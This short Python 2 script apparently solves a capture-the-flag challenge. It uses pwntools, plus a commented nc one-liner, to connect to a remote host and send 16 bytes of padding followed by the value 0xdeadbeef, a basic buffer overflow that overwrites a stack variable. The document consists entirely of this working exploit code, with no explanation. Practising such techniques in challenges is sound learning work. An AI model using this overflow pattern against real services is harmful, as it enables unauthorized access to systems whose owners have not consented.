#python -c "print 'a'*16 + '\xef\xbe\xad\xde'" | nc 18.136.167.108 18040
from pwn import *

r = remote('18.136.167.108',18040)
payload = 'a'*16
payload += p32(0xdeadbeef)
r.sendline(payload)
print r.recvall()